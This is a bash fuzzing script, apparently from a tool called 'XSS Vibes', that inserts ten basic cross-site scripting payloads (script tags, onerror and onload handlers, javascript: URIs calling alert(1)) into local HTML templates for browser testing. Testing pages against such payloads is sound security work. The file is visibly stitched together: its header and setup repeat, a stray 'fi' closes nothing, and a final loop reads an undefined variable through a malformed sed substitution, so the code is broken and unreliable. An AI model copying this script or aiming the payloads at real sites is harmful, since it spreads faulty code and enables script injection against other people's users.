#!/bin/bash
# XSS Vibes - DPE Fuzzing Script
# Usage: ./fuzz_templates.sh <template_name> <payload_file>

TEMPLATE_DIR="$(dirname "$0")"
PAYLOAD_FILE="${2:-../xss_vibes/data/basic_xss.json}"

if [ -z "$1" ]; then
    echo "🎯 DPE Fuzzing Script"
    echo "Usage: $0 <template_name> [payload_file]"
    echo ""
    echo "Available templates:"
    ls -1 "$TEMPLATE_DIR"/*_template.html | sed 's/_template.html$//' | sed 's/.*\///' | sed 's/^/  • /'
    exit 1
fi

TEMPLATE_NAME="$1"
TEMPLATE_FILE="$TEMPLATE_DIR/${TEMPLATE_NAME}_template.html"

if [ ! -f "$TEMPLATE_FILE" ]; then
    echo "❌ Template not found: $TEMPLATE_FILE"
    exit 1
fi

echo "🔥 Starting DPE fuzzing for: $TEMPLATE_NAME"
echo "📄 Template: $TEMPLATE_FILE"
echo "💣 Payloads: $PAYLOAD_FILE"
echo ""

#!/bin/bash
# XSS Vibes - DPE Fuzzing Script
# Usage: ./fuzz_templates.sh <template_name> <payload_file>

TEMPLATE_DIR="$(dirname "$0")"
PAYLOAD_FILE="${2:-../xss_vibes/data/basic_xss.json}"

if [ -z "$1" ]; then
    echo "🎯 DPE Fuzzing Script"
    echo "Usage: $0 <template_name> [payload_file]"
    echo ""
    echo "Available templates:"
    ls -1 "$TEMPLATE_DIR"/*_template.html | sed 's/_template.html$//' | sed 's/.*\///' | sed 's/^/  • /'
    exit 1
fi

TEMPLATE_NAME="$1"
TEMPLATE_FILE="$TEMPLATE_DIR/${TEMPLATE_NAME}_template.html"

if [ ! -f "$TEMPLATE_FILE" ]; then
    echo "❌ Template not found: $TEMPLATE_FILE"
    exit 1
fi

echo "🔥 Starting DPE fuzzing for: $TEMPLATE_NAME"
echo "📄 Template: $TEMPLATE_FILE"
echo "💣 Using default XSS payloads"
echo ""

# Default XSS payloads for testing
declare -a payloads=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "javascript:alert(1)"
    "';alert(1);//"
    '">alert(1)</script>'
    "<svg onload=alert(1)>"
    "{{PAYLOAD}}"
    "<iframe src=javascript:alert(1)>"
    "<body onload=alert(1)>"
    "<marquee onstart=alert(1)>"
)

COUNTER=1
for payload in "${payloads[@]}"; do
    OUTPUT_FILE="$TEMPLATE_DIR/test_${TEMPLATE_NAME}_${COUNTER}.html"
    
    # Use Python to safely replace payload
    python3 -c "
import sys
payload = '''$payload'''
with open('$TEMPLATE_FILE', 'r') as f:
    content = f.read()
content = content.replace('{{PAYLOAD}}', payload)
with open('$OUTPUT_FILE', 'w') as f:
    f.write(content)
print(f'📋 Test $COUNTER: Generated $OUTPUT_FILE')
print(f'   Payload: {payload[:50]}...')
"
    
    ((COUNTER++))
done

echo ""
echo "✅ DPE fuzzing complete! Generated $((COUNTER-1)) test files"
echo "🌐 Open generated HTML files in browser to test"
echo ""
echo "🎯 Quick test commands:"
echo "  firefox test_${TEMPLATE_NAME}_1.html"
echo "  chromium test_${TEMPLATE_NAME}_1.html"
fi

COUNTER=1
echo "$PAYLOADS" | while read -r payload; do
    if [ -n "$payload" ]; then
        OUTPUT_FILE="$TEMPLATE_DIR/test_${TEMPLATE_NAME}_${COUNTER}.html"
        
        # Replace {{PAYLOAD}} with actual payload
        sed "s/{{PAYLOAD}}/${payload//\//\\}/g" "$TEMPLATE_FILE" > "$OUTPUT_FILE"
        
        echo "📋 Test $COUNTER: $OUTPUT_FILE"
        echo "   Payload: ${payload:0:50}..."
        
        ((COUNTER++))
    fi
done

echo ""
echo "✅ DPE fuzzing complete!"
echo "🌐 Open generated HTML files in browser to test"
